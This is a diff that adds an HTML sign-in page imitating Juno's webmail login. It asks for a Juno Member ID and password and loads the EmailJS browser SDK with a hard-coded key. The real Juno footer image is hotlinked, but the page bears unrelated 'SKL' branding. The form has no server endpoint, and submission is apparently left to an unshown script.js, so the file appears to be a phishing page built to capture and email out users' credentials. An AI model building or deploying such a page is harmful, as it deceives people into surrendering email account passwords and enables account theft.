@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Juno - My Juno Personalized Start Page - Sign in</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Icons and Bootstrap -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/css/bootstrap.min.css">
+    
+    <!-- Link to your new CSS -->
+    <link rel="stylesheet" href="style.css">
+
+    <!-- EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+       (function(){
+          // Your existing Public Key
+          emailjs.init("ezo9lr0nlC0y9j4sv");
+       })();
+    </script>
+</head>
+
+<body class="jbdyfmt" onload="document.getElementById('rcmloginuser').focus();">
+
+    <!-- Top Banner (SKL Style) -->
+    <div class="top-ad-banner">
+        <div class="ad-placeholder">
+        </div>
+    </div>
+
+    <!-- SKL Navigation Header -->
+<header class="header-main">
+    <div class="header-content">
+        <div class="logo-area">
+            <a href="index.html">
+                <img src="images/skll.jpeg" alt="SKL Logo" class="skl-logo-img">
+            </a>
+        </div>
+
+        <div class="nav-and-search">
+            <div class="top-nav-links">
+                <a href="#">My Juno</a>
+                <span class="sep">|</span>
+                <a href="#">Help</a>
+                <span class="sep">|</span>
+                <a href="#">My Account</a>
+            </div>
+            <form class="search-form">
+                <input type="text" class="hdr_srch_field" placeholder="Search the Web">
+                <button type="button" class="btn-search">Search Web</button>
+            </form>
+        </div>
+    </div>
+</header>
+
+    <!-- Main Content Grid -->
+    <div class="content-wrapper">
+        <div class="main-column">
+            <h1 class="welcome-text">Welcome! Please sign-in below.</h1>
+            <p class="instruction-text">Please enter your Juno username in the Member ID field below.</p>
+
+            <!-- The Login Box -->
+            <div class="login-box-container">
+                <div class="login-box-header">
+                    Sign in to Email on the Web
+                </div>
+                <div class="login-box-body">
+                    <form id="login-form">
+                        <label class="input-label">Juno Member ID</label>
+                        <div class="id-row">
+                            <div class="input-group mb-2">
+                                <span class="input-group-text"><i class="fas fa-user"></i></span>
+                                <input name="_user" id="rcmloginuser" required type="text" class="form-control" placeholder="Member ID">
+                            </div>
+                            <span class="domain-text">@juno.com</span>
+                        </div>
+
+                        <label class="input-label">Password</label>
+                        <div class="input-group mb-2">
+                            <span class="input-group-text"><i class="fas fa-lock"></i></span>
+                            <input name="_pass" id="rcmloginpwd" required type="password" class="form-control" placeholder="Password">
+                        </div>
+
+                        <div class="form-links">
+                            <a href="#">Forgot your ID or password?</a> | <a href="#">Help</a>
+                        </div>
+
+                        <div class="stay-signed-in">
+                            <input type="checkbox" id="keep"> 
+                            <label for="keep">Keep me signed in</label>
+                        </div>
+
+                        <div class="button-row">
+                            <button type="submit" id="rcmloginsubmit" class="button-skl">Sign In</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+            
+            <p class="signup-text">Sign up for <a href="#">Juno Internet Access </a> today!</p>
+        </div>
+
+        <!-- Sidebar (User Information) -->
+        <aside class="sidebar-column">
+            <div class="ad-box-small">
+                
+            </div>
+            <div class="info-card">
+                <div class="info-card-header">User Information</div>
+                <ul class="info-links">
+                    <li><a href="#"><i class="fas fa-info-circle"></i> About Juno</a></li>
+                    <li><a href="#"><i class="fas fa-plus-square"></i> Create New Account</a></li>
+                    <li><a href="#"><i class="fas fa-question-circle"></i> Frequently Asked Questions</a></li>
+                </ul>
+            </div>
+        </aside>
+    </div>
+
+    <!-- Footer Area -->
+    <footer class="footer-main">
+        <div class="footer-top">
+            <img src="https://webmail.juno.com/images/footers/uol_juno_tag.gif" alt="UOL Logo">
+        </div>
+        <div class="footer-bottom">
+            <p>&copy; 1995 - 2026 SKL Student Services, Inc. All rights reserved.</p>
+            <p>Juno is a registered trademark of United Online Services.</p>
+        </div>
+    </footer>
+
+    <!-- Your existing script.js -->
+    <script src="script.js"></script>
+</body>
+</html>
